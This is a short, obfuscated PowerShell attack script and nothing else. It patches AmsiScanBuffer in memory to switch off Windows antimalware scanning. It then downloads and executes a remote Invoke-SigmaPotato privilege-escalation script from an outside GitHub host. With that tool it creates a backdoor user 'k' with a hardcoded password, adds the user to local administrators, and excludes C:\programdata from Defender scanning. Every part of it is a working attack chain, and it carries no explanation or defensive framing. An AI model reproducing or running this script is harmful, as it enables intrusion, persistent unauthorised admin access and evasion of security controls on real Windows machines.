
#Rasta-mouses Amsi-Scan-Buffer patch \n
$sHv7JfDWdTBgg0rSmI = @"
using System;
using System.Runtime.InteropServices;
public class sHv7JfDWdTBgg0rSmI {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr prBQ11yH_Mu523wMOms, string jsP93AJ6vHvvliPop);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr LT5, UIntPtr UunjitP1NF8C2y4, uint tee, out uint wE5dU9nwfzqfS1D8anal);
}
"@

Add-Type $sHv7JfDWdTBgg0rSmI

$JlDvxc3PfkcNSiu = [sHv7JfDWdTBgg0rSmI]::LoadLibrary("$([cHaR]([BYTe]0x61)+[cHAR](109)+[cHAR]([BYTE]0x73)+[Char]([byte]0x69)+[cHAR]([BYTE]0x2e)+[cHAr](100+53-53)+[chaR](108*14/14)+[char](108*94/94))")
$cx8Se2uZPx3 = [sHv7JfDWdTBgg0rSmI]::GetProcAddress($JlDvxc3PfkcNSiu, "$(('Âmsî'+'Scàn'+'Búff'+'èr').NORmalizE([Char](70)+[CHar](111)+[ChAR]([bYTe]0x72)+[CHAR]([byte]0x6d)+[chaR](68)) -replace [ChAr]([BYTE]0x5c)+[cHAr](112)+[cHar]([Byte]0x7b)+[cHar]([BYtE]0x4d)+[cHAr]([bYtE]0x6e)+[ChAr](109+16))")
$p = 0
[sHv7JfDWdTBgg0rSmI]::VirtualProtect($cx8Se2uZPx3, [uint32]5, 0x40, [ref]$p)
$fZ98mwc3Vr = "0xB8"
$_a75abQBa1d8jUtZ = "0x57"
$eXLIM6cR6DephK = "0x00"
$AhOUOg = "0x07"
$v7SwZ_LdI8HKiZOhOppj = "0x80"
$Vr_VLV02Ii8Y = "0xC3"
$ftIdwq4Mak = [Byte[]] ($fZ98mwc3Vr,$_a75abQBa1d8jUtZ,$eXLIM6cR6DephK,$AhOUOg,+$v7SwZ_LdI8HKiZOhOppj,+$Vr_VLV02Ii8Y)
[System.Runtime.InteropServices.Marshal]::Copy($ftIdwq4Mak, 0, $cx8Se2uZPx3, 6)
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-SigmaPotato.ps1')
Invoke-SigmaPotato -command "net user k kopq@123 /add"
Invoke-SigmaPotato -command "net localgroup administrators k /add"
Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath C:\programdata"








